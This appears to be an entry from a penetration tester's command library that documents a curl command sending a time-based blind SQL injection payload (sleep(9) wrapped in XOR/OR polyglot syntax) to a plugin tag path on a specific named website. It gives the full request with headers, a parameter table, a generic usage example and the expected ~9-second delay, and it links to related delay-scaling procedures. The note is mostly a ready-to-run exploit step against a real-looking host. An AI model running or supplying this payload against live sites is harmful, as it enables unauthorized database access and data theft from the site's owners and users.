---
data: >-
  curl -s -w "%{time_total}s"
  "https://betterscience.org/plugin/tag/if(now()%3dsysdate()%2csleep(9)%2c0)/%2a'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22%2f*"
  -H "Host: betterscience.org" -H "Cookie: [session cookies]" -H "Referer:
  https://betterscience.org/" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1;
  WOW64)..." -H "X-Requested-With: XMLHttpRequest" > /dev/null
tags:
  - sqli
  - scalability
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:14.890Z'
id: cb228427-9ea9-4fcc-9ed8-e06342c90a0c
verified: false
validated: true
submitted: true
---
# curl-sqli-payload-sleep-9

## Command

```bash
curl -s -w "%{time_total}s" "https://betterscience.org/plugin/tag/if(now()%3dsysdate()%2csleep(9)%2c0)/%2a'XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR'%22XOR(if(now()%3dsysdate()%2csleep(9)%2c0))OR%22%2f*" -H "Host: betterscience.org" -H "Cookie: [session cookies]" -H "Referer: https://betterscience.org/" -H "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64)..." -H "X-Requested-With: XMLHttpRequest" > /dev/null
```

## Description

Injects 9-second sleep payload to test scalability of the SQLi.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent | Yes |
| `-w` | Time output | Yes |
| URL | Encoded sleep(9) payload | Yes |
| Headers | Required for consistency | Yes |

## Examples

### Basic Usage

```bash
curl -s -w "%{time_total}s" "https://target/plugin/tag/[sleep9-payload]" > /dev/null
```

## Expected Output

~9.298s delay.

## Related

- [[commands/curl-sqli-payload-sleep-6]]
- [[procedures/Scale-Delay-with-Longer-Sleep-Times]]
